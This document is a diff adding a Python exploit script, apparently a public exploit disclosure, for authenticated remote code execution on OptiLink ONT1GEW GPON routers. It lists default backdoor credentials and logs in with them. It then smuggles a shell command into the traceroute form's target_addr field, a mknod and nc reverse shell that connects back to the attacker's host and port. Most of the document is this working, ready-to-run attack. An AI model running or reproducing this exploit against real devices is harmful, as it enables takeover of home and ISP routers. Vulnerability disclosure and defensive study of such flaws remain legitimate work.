@@ -1,0 +1,115 @@
+# Exploit Title: OptiLink ONT1GEW GPON 2.1.11_X101 Build 1127.190306 - Remote Code Execution (Authenticated)
+# Date: 23/03/2021
+# Exploit Authors:  Developed by SecNigma and Amal.
+# Vendor Homepage:  https://optilinknetwork.com/
+# Version: ONT1GEW V2.1.11_X101 Build.1127.190306
+# Mitigation: Ask the vendor to issue a router upgrade to Build.1653.210425 and above,
+# as they do not release the firmware to the public for some unknown reason.
+# Additional notes:			
+# Tested on the following configuration. Might be suitable for other OptiLink devices with Build <= 1127.190306.
+# Device Name: ONT1GEW
+# Software Version:  V2.1.11_X101
+# Build Information: Build.1127.190306 
+# Chances are that XPONs of C-DATA company are affected too.
+# Our research indicated that Optilink devices are just a rebranded version of C-Data.
+# This exploit was tested on the following configuration.
+
+#!/usr/bin/python3
+
+import requests
+import argparse
+import re
+
+def is_login_success(r):
+	match=re.findall("invalid username!|bad password!|you have logined error 3 consecutive times, please relogin 1 minute later!|another user have logined in",r.text)
+	if match:
+	    return match
+		
+# Default configuration
+# Router address   = 192.168.101.1
+# LPORT 		   = 9001
+# Default Username = e8c  / Backdoor     /
+# Default Password = e8c /  Credentials /
+
+parser= argparse.ArgumentParser()
+
+parser.add_argument("-t", "--target", dest = "target", default = "192.168.101.1", help="Target OptiLink Router IP")
+parser.add_argument("-l", "--lhost", dest = "lhost" , help="Our Local IP to catch the shell!", required=True)
+parser.add_argument("-lp", "--lport", dest = "lport", default = "9001", help="Our Local port for catching the shell!")
+parser.add_argument("-u", "--user", dest = "user", default = "e8c", help="Username of Optilink Router")
+parser.add_argument("-p", "--pass", dest = "passw", default = "e8c", help="Password of Optilink Router")
+args = parser.parse_args()
+
+target=args.target,
+lhost=args.lhost,
+lport=args.lport,
+user=args.user,
+passw=args.passw
+
+# e8c:e8c are the backdoor administrator creds to Optilink devices
+# Alternate backdoor credentials are  adsl:realtek, admin:admin.
+user2="e8c"
+passw2="e8c"
+
+home_url="http://"+target[0]+"/boaform/admin/formLogin"
+
+print("[+] Trying to authenticate...")
+
+# Authenticate ourselves first
+data={'username':user, 'psd':passw}
+r=requests.post(home_url,data)
+
+res=is_login_success(r)
+if res:
+	print("[-] Exploit failed when using the following credentials: "+str(user)+":"+str(passw)+"")
+	print("[-] Exploit failed with the following error:")
+	print(res)
+	print("[!] Do you want to try to authenticate with the following credentials: "+str(user2)+":"+str(passw2)+" ?")
+	val = input("Press y or n : ")
+	if val[0].lower()=="y":
+		print("[+] Trying to authenticate with the credentials "+str(user2)+":"+str(passw2)+"")
+		
+		# Authenticate ourselves with new creds
+		data={'username':user2, 'psd':passw2}
+		r=requests.post(home_url,data)
+		res2=is_login_success(r)
+		
+		if res2:
+			print("[-] Exploit failed when using the following credentials: "+str(user2)+":"+str(passw2)+"")
+			print("[-] Exploit failed with the following error:")
+			print(res2)
+			print("[-] Halting Execution.")
+			exit()
+	else:
+		print("Received input "+val+"")
+		print("[-] Halting Execution.")
+		exit()
+	
+print("[+] Looks like authentication was succesful!")
+print("[+] Trying to fetch the WAN Name...")
+
+# Fetching Wan Name
+# wan_name="1_INTERNET_R_VID_***"
+
+get_wan_url = "http://"+target[0]+"/diag_ping.asp"
+r=requests.get(get_wan_url)
+
+match=re.findall("name=\"waninf\"><option value=\"(.*?)\">",r.text)
+wan_name=match[0]
+
+
+print("[+] Initiating Exploitation. Don't forget to start the nc listener on port "+str(lport)+"..")
+print("[+] I'm Waiting...Said Captain Jagdish *wink* *wink*")
+print("[+] If everything went right, you should've gotten a shell right now!")
+
+# Starting Exploitation
+
+# The same vulnerability exists in formPing and formTracert.
+# exploit_url = "http://"+target[0]+"/boaform/admin/formPing"
+exploit_url = "http://"+target[0]+"/boaform/admin/formTracert"
+# Found a new way to get reverse shell using mknod instead of mkfifo during the exploitation of this router :)
+# BusyBox binary used by this router was very limited and didn't had mkfifo. So, we got creative to workaround it.
+# The payload is available at swisskeyrepo's PayloadAllTheThings GitHub repo as Netcat BusyBox payload.
+# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-busybox
+post_data='target_addr="1.1.1.1+`rm+/tmp/f%3bmknod+/tmp/f+p%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+'+lhost[0]+'+'+lport[0]+'+>/tmp/f`"&waninf='+wan_name+'"'
+r=requests.post(exploit_url,post_data)
